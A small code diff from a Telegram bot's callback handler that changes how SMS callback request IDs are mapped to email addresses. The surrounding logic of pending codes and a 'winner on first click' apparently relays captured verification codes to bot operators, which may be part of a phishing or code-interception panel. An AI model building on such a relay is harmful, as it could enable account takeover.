@@ -390,9 +390,10 @@ bot.on("callback_query", async (query) => {
     let email = identifier;
 
     // ✅ For SMS callbacks, extract real email from pendingCodes[requestId]
-    if (action.startsWith("sms_") && pendingCodes && pendingCodes[identifier]) {
-      email = pendingCodes[identifier].email;
-      console.log(`📝 SMS callback: requestId ${identifier} maps to email ${email}`);
+    if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
+      // This is a SMS requestId, get email from server via update-status call
+      // The server will handle mapping requestId → email
+      console.log(`📝 SMS callback: requestId ${identifier}`);
     }
 
     // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for SMS!)
